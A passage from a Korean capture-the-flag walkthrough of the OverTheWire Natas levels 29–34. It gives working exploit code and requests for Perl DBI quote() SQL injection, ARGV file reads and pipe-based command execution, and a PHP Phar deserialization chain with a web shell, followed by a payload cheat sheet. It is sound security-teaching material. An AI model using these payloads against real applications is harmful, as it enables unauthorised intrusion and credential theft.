`quote()`의 두 번째 인자로 SQL 타입을 조작합니다.

1. 로그인 폼의 소스는 대략 다음과 같습니다.

```perl
my $password = $dbh->quote(param('password'));
```

2. `param('password')`는 리스트 컨텍스트에서 여러 값을 반환합니다.
3. `quote($value, $data_type)`의 두 번째 인자에 숫자 타입을 주면 값이 따옴표로 감싸지지 않습니다.
4. 같은 이름의 `password` 파라미터를 두 번 보냅니다.

```text
username=natas28
password=' or 1=1 -- 
password=2
```

5. 두 번째 `password=2`가 SQL 타입으로 해석되어 첫 번째 값이 그대로 쿼리에 들어갑니다.

```python
import requests
from requests.auth import HTTPBasicAuth

r = requests.post(
    "http://natas30.natas.labs.overthewire.org/index.pl",
    data=[
        ("username", "natas28"),
        ("password", "' or 1=1 -- "),
        ("password", "2"),
    ],
    auth=HTTPBasicAuth("natas30", "여기에_비밀번호"),
)
print(r.text)
```

> **개념** — API가 인자를 리스트로 받을 때 공격자가 예상치 않은 타입/순서를 넣을 수 있습니다. `quote()`의 타입 인자를 사용자 입력으로 결정하면 안 됩니다.

#### natas31 → natas32

`Perl Jam 2` · ★★★

`ARGV` 파일핸들로 쿼리 문자열의 파일을 읽습니다.

1. CSV 업로드 폼이 있고, 소스는 대략 다음과 같습니다.

```perl
my $file = $cgi->param('file');
while (<$file>) {
    ...
}
```

2. `param('file')`은 같은 이름의 값이 여러 개면 **첫 번째 값**을 반환합니다.
3. 실제 파일보다 앞에 `file`이라는 이름의 일반 값 `ARGV`를 넣습니다.
4. `<$file>`은 `ARGV` 파일핸들이 되어 쿼리 문자열의 값들을 파일명으로 열어 읽습니다.
5. Burp Repeater에서 멀티파트 요청을 다음과 같이 만듭니다.

```http
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Authorization: Basic ...
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"

ARGV
------boundary
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

1,2
------boundary
Content-Disposition: form-data; name="submit"

Upload
------boundary--
```

6. `@ARGV`에 `/etc/natas_webpass/natas32`가 들어가고, `<>`가 그 파일을 읽어 출력합니다.

> **개념** — Perl CGI에서 `upload()`와 `param()`의 리스트 컨텍스트 동작을 악용하는 고전적인 버그입니다. 파일 업로드 이름과 일반 파라미터 이름을 같게 만들 수 있다는 점이 핵심입니다.

#### natas32 → natas33

`RCE` · ★★★

같은 Perl Jam 2 기법으로 명령을 실행합니다.

1. natas31과 거의 같은 페이지지만, 이번에는 명령 실행이 필요합니다.
2. 쿼리 문자열 끝에 `|`를 붙이면 `<>`가 명령을 실행하고 출력을 읽습니다.
3. 먼저 현재 디렉터리를 확인합니다.

```text
/index.pl?ls%20.%20|
```

4. `getpassword` 실행 파일이 보이면 그것을 실행합니다.

```text
/index.pl?./getpassword%20|
```

5. 요청은 natas31과 동일하게 `file=ARGV` 파트를 앞에 두고 보냅니다.

> **개념** — `ARGV`에 명령을 넣을 때 `|`를 붙이면 `open()`이 파이프 모드로 동작합니다. 읽기 전용 파일 열기로 보였던 기능이 RCE가 됩니다.

#### natas33 → natas34

`Phar deserialization` · ★★★

`md5_file("phar://...")`로 metadata를 역직렬화합니다.

1. "firmware" 업로드 폼이 있고, 소스에는 `Executor` 클래스가 있습니다.
2. 업로드 파일은 업로드 디렉터리로 이동하고, `__destruct()`에서 `md5_file($this->filename)`이 `$signature`와 같으면 `passthru("php " . $this->filename)`을 실행합니다.
3. Phar 파일의 metadata는 `file_exists`, `md5_file` 같은 파일 함수가 `phar://` 경로를 읽을 때 **자동으로 unserialize** 됩니다.
4. `Executor` 객체를 metadata에 넣어 `$signature = true`, `$filename = "shell.php"`로 조작합니다.
5. 먼저 웹셸 파일을 만듭니다.

```php
<?php echo file_get_contents('/etc/natas_webpass/natas34'); ?>
```

6. Phar 생성 스크립트를 만듭니다.

```php
<?php
class Executor {
    private $filename = "shell.php";
    private $signature = true;
}

$p = new Phar("natas.phar");
$p->startBuffering();
$p->addFromString("test.txt", "text");
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->setMetadata(new Executor());
$p->stopBuffering();
```

7. `phar.readonly`를 끄고 실행합니다.

```bash
php -d phar.readonly=false natas33.php
```

8. Burp로 `shell.php`를 업로드하면서 숨겨진 `filename`을 `shell.php`로 바꿉니다.
9. 같은 방식으로 `natas.phar`를 업로드하면서 `filename`을 `natas.phar`로 바꿉니다.
10. 마지막으로 아무 파일이나 업로드하되 `filename`을 `phar://natas.phar/test.txt`로 바꿉니다.
11. `md5_file()`이 Phar metadata를 읽으면서 `Executor::__destruct()`가 실행되고, `php shell.php`가 돌아 natas34 비밀번호가 출력됩니다.

> **개념** — Phar 파일은 단순한 압축 파일이 아니라 metadata를 포함할 수 있고, `phar://` 스트림을 처리하는 순간 그 metadata가 역직렬화됩니다. `md5_file()` 같은 함수도 예외가 아닙니다.
>
> **주의** — 업로드 파일명은 기본적으로 랜덤(세션 ID)입니다. 반드시 Burp로 `filename` 필드를 바꿔야 하며, `shell.php`와 `natas.phar`가 같은 업로드 위치에 있어야 합니다.

## natas34 · 완주

마지막 레벨입니다. 별도의 다음 비밀번호는 없고, 축하 페이지(또는 플레이스홀더)가 나옵니다.
여기까지 왔다면 Natas 전체를 완료한 것입니다.

## 치트시트

| 취약점 | 나타나는 곳 | 핵심 |
|---|---|---|
| 정보 노출 | 소스 주석, `robots.txt`, `/files/`, `.inc` | 화면 밖의 파일을 먼저 찾기 |
| Path Traversal / LFI | `?page=`, include | `../`, 절대 경로 |
| Command Injection | `passthru`, `system`, Perl `open` | 세미콜론, 파이프, `$()`, null byte |
| SQL Injection | 로그인, 검색 | `' OR 1=1 -- `, `UNION SELECT` |
| Blind SQLi | 결과 메시지 없음 | 참/거짓, `SLEEP()` |
| 인증 우회 | 쿠키, Referer, 세션 | 값 변조, 세션 ID 예측 |
| 파일 업로드 | 업로드 폼 | 확장자, 매직 바이트, 웹 루트 |
| 역직렬화 | 쿠키, Phar | `unserialize`, `__destruct`, `phar://` |
| 암호 | 쿠키 XOR, ECB | known plaintext, 블록 재조립 |

## 막혔을 때 체크리스트

1. 소스 코드가 링크되어 있는지 확인 (`?source`, "View sourcecode")
2. `?debug`를 붙여 디버그 출력 확인
3. Burp Repeater로 요청을 직접 수정
4. URL 인코딩(`%00`, `%0A`, `%20`, `%3B`) 확인
5. 필터가 무엇을 막는지 먼저 파악하고 우회 방법 찾기
6. 에러 메시지(경로, 쿼리, 스택)에서 힌트 얻기

## 참고 자료

- [OverTheWire Natas 공식](https://overthewire.org/wargames/natas/)
- [LearnHacking Natas 시리즈](https://learnhacking.io/)
- [CertCube Natas 전체 writeup](https://blog.certcube.com/overthewire-natas/)

## 주의

학습용 워게임 풀이입니다. 실제 서비스에 같은 기법을 사용하는 것은 불법일 수 있습니다.
